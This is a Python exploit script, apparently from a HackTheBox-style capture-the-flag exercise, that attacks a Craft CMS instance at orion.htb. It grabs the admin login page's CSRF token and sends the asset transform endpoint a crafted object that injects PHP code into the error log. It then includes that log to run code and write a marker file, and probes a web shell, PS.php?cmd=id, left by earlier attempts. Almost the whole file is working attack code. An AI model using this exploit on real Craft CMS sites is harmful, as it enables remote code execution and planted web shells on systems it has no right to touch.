import requests, re, json, time, sys

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}

def send(body):
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS, timeout=30)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if not m:
        print(f'  DEBUG No CSRF. First 300: {r.text[:300]}')
        return None
    csrf = m.group(1)
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
               json=body, headers={**HEADERS, 'Content-Type': 'application/json', 'X-CSRF-Token': csrf}, timeout=30)
    return r2

# Try simpler inject: just write a marker file
# Using touch via exec - wait, exec requires arg.
# Use file_put_contents which works from PHP
print('[*] Test 1: Trigger require() error with marker payload')
time.sleep(1)

marker_path = '/var/www/html/craft/web/INJECTED_MARKER'
php_code = f"<?php file_put_contents('{marker_path}', 'MARKED'); ?>"
inject_path = '/idontexist/' + php_code

body1 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'yii\\rbac\\PhpManager',
            'itemFile': inject_path
        }
    }
}
r1 = send(body1)
print(f'  Step 1: {r1.status_code if r1 else "None"}')

time.sleep(3)

print('[*] Test 2: Include error_log')
body2 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'yii\\rbac\\PhpManager',
            'itemFile': '/var/www/html/craft/storage/logs/phperrors.log'
        }
    }
}
r2 = send(body2)
print(f'  Step 2: {r2.status_code if r2 else "None"}')

time.sleep(2)

print('[*] Test 3: Check marker')
r3 = requests.get(f'{HOST}/INJECTED_MARKER', headers=HEADERS, timeout=10)
print(f'  Marker: {r3.status_code}')
if r3.status_code == 200:
    print(f'  [+] FOUND! Content: {r3.text[:200]}')
else:
    print(f'  {r3.text[:100]}')

# Also check PS.php from previous attempts
r4 = requests.get(f'{HOST}/PS.php?cmd=id', headers=HEADERS, timeout=10)
print(f'  PS.php: {r4.status_code}')
